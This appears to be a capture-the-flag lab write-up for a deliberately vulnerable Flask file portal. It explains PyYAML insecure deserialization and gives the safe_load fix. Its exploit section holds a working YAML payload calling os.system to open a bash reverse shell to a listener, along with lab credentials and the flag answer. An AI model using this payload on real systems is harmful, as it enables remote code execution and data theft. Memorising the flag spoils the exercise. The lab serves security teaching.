# LAB2 – Server-B (SYNAPSE DataVault)

Server-B hosts the SYNAPSE DataVault — a Flask application with an intentional YAML insecure deserialization vulnerability (OWASP A08). The objective is to upload a malicious YAML file, trigger remote code execution via a reverse shell, and exfiltrate the final flag from `/app/data/finalData.txt`.

---

## Access

```bash
sshpass -p S3rv3rB ssh ubuntu@192.168.30.x  # Server-B IP
# From EVE-NG host with bridge vnet0_2 active (IP 192.168.30.x/24)
```

Web application accessible at: `http://192.168.30.x` (port 80)

## System

| Parameter | Value |
|-----------|-------|
| OS | Ubuntu 24.04.3 LTS |
| Hostname | server-b-monitor |
| IP | 192.168.30.x/24 |
| Gateway | 192.168.30.x (VyOS eth1) |
| App path | /opt/datavault/ |

## Docker stack

```bash
cd /opt/datavault && sudo docker compose up -d
sudo docker compose ps   # datavault-flask Up, port 80->5000
```

| Container | Image | Port |
|-----------|-------|------|
| datavault-flask | python:3.11-slim | 80->5000 |

## Application — SYNAPSE DataVault

The DataVault is a file management portal for uploading and previewing corporate data files.

**Credentials:** `operator` / `D4t4V4ult#2024`  
(Found in Server-A admin panel after completing FLAG #2)

**Routes:**
| Route | Description |
|-------|-------------|
| `/` | File listing |
| `/login` | Login form |
| `/upload` | File upload (PDF, TXT, YAML, YML) |
| `/preview/<filename>` | Preview uploaded file |
| `/download/<filename>` | Download uploaded file |

## Vulnerability — YAML Insecure Deserialization (OWASP A08)

The preview route loads YAML files using `yaml.UnsafeLoader`:

```python
# VULNERABLE CODE — intentional for lab
parsed = str(yaml.load(raw, Loader=yaml.UnsafeLoader))
```

`yaml.UnsafeLoader` (equivalent to `yaml.load` without Loader argument) allows instantiation of arbitrary Python objects, including `os.system`. This enables unauthenticated remote code execution when previewing a crafted YAML file.

**Why it is dangerous:** PyYAML's `!!python/object/apply:` tag calls any Python callable with attacker-controlled arguments. With `UnsafeLoader`, there is no restriction on which callables can be invoked.

**Secure alternative:** `yaml.safe_load()` — only parses standard YAML types.

## Exploit — Reverse Shell via YAML Upload

### Step 1 — Start listener on Parrot

```bash
nc -lvnp 4444
```

### Step 2 — Create malicious YAML payload

```bash
echo '!!python/object/apply:os.system ["bash -c '"'"'bash -i >& /dev/tcp/10.0.40.x/4444 0>&1'"'"'"]' > exploit.yml
```

Or manually create `exploit.yml`:

```yaml
!!python/object/apply:os.system
- "bash -c 'bash -i >& /dev/tcp/10.0.40.x/4444 0>&1'"
```

### Step 3 — Upload and trigger

1. Browse to `http://192.168.30.x` — login as `operator / D4t4V4ult#2024`
2. Upload `exploit.yml` via the upload form
3. Click **Preview** on `exploit.yml`
4. Reverse shell arrives on the `nc` listener

### Step 4 — Exfiltrate the flag

```bash
# In the reverse shell:
cat /app/data/finalData.txt
```

Returns `FLAG{synapse_nexus_exfil_complete}` — **FLAG #3**

## Flag location

| Flag | Location | How to reach |
|------|----------|-------------|
| FLAG{synapse_nexus_exfil_complete} | `/app/data/finalData.txt` (inside container) | Reverse shell via YAML deserialization |
